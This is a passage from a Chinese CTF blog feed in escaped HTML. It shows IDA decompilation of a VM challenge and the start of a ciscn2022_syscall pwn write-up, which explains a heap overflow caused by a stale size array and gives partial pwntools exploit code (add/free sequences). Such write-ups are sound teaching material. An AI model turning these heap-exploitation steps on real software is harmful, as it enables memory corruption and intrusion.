class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v25 + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = v25 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v11 = (_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v11 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v12 = (_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v12 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) = *(_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] &amp;lt;&amp;lt; *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;6&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v26 = i + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v26 + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = v26 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v13 = (_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v13 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v14 = (_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v14 = sub_4013AC(dest);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) = *(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] &amp;gt;&amp;gt; *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_401334(dest, *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;7&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *((&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)dest + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &amp;gt; &lt;span class=&#34;number&#34;&gt;65&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *dest = ((__int64 (__fastcall *)(__int64))dest[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;])(&lt;span class=&#34;number&#34;&gt;256LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *((_DWORD *)dest + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v15 = (_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * *(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * ++i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v16 = *dest;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)++*((_DWORD *)dest + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) + v16) = *v15;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;8&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v28 = *(_DWORD *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * ++i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v17 = *dest;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v18 = *((_DWORD *)dest + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *((_DWORD *)dest + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) = v18 - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)(dest[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v28) = *(_DWORD *)(v17 + &lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * v18);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *((_DWORD *)dest + &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *(_DWORD *)(*dest + &lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * *((&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)dest + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) += *(_DWORD *)(&lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt; * ++i + dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_4012FC(src);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;逆向的工作量比较大。但是大概理了下里面数据的存储格式，以 4 字节作为基本的处理单元，每次处理 3 个或者两个，第一个用作 case 的判断。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;加法&lt;/li&gt;
&lt;li&gt;减法&lt;/li&gt;
&lt;li&gt;乘法&lt;/li&gt;
&lt;li&gt;除法&lt;/li&gt;
&lt;li&gt;左移位&lt;/li&gt;
&lt;li&gt;右移位&lt;/li&gt;
&lt;li&gt;push    RI  count 大于 65, 重新申请一个 0x100 的 chunk 用作函数的 stack。储存算术的数据，但是，不会检查 idx，可能会导致越界。&lt;/li&gt;
&lt;li&gt;pop RI&lt;/li&gt;
&lt;li&gt;push imm32&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以上均为接受两个 int 类型，我们的基本操作快的数量不超过 64，为什么这这样说，加载操作数的时候，加两次，将操作数拿出来，减去两次，储存计算结果加一次。&lt;/p&gt;
&lt;p&gt;程序实现基本的算术运算以及逻辑运算。并且采用了 stack 进行存储，但是程序没有输出啊。&lt;/p&gt;
&lt;h2 id=&#34;尚未解决&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尚未解决&#34;&gt;#&lt;/a&gt; 尚未解决&lt;/h2&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/18/ciscn2022-syscall/</guid>
            <title>ciscn2022_syscall</title>
            <link>http://example.com/2022/06/18/ciscn2022-syscall/</link>
            <category>writeup</category>
            <pubDate>Sat, 18 Jun 2022 21:15:41 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ciscn2022_syscall&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2022_syscall&#34;&gt;#&lt;/a&gt; ciscn2022_syscall&lt;/h1&gt;
&lt;p&gt;程序的漏洞点在于 free 后不会清空 size 数组对应的数据，而且在同一个该位置再次申请一个 chunk 的时候，&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( choice == &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt; )                    &lt;span class=&#34;comment&#34;&gt;// malloc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      idx = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, sub_E1B, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, getheap_ptr, idx, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v2 = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, strings, &lt;span class=&#34;number&#34;&gt;5LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, printf_, v2, &lt;span class=&#34;number&#34;&gt;5LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      szie = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, read_, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( szie &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( szie &amp;gt; &lt;span class=&#34;number&#34;&gt;40&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v3 = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, malloc_, szie, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;// malloc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, saveheap, idx, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v4 = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, strings, &lt;span class=&#34;number&#34;&gt;9LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, printf_, v4, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v5 = szie;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v6 = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, getheap_ptr, idx, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (syscall)(&lt;span class=&#34;number&#34;&gt;0x1231&lt;/span&gt;LL, v6, v5, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v7 = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, getheap_ptr, idx, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, sub_E62, v7, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;) )&lt;span class=&#34;comment&#34;&gt;// ke I					//这里会检查我们输入的数据是否为DEADBEEF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_32;													&lt;span class=&#34;comment&#34;&gt;//如果是就会跳转，而下面则是记录这次我们申请的size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, read_context, idx, szie);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v8 = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, getheap_ptr, idx, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v9 = (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, strings, &lt;span class=&#34;number&#34;&gt;7LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (syscall)(&lt;span class=&#34;number&#34;&gt;38929LL&lt;/span&gt;, printf_, v9, v8);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;// 如果是就会跳转，而下面则是记录这次我们申请的 size，这里一旦跳转，size 数组不会被更改，可能存在溢出。如上一次我们在这个位置放的堆块，申请的 size 是 0x28, 下一次我们申请的是 0x10，数据为 DEADBEEF，这里的 size 依旧是 0x28，造成溢出。&lt;/p&gt;
&lt;p&gt;思路&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;申请出来四个 chunk，size 数组都是为 0x28&lt;/p&gt;
&lt;p&gt;然后申请 4 个 0x10，数据为 DEADBEEF&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;new_add&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;17&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size: &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span 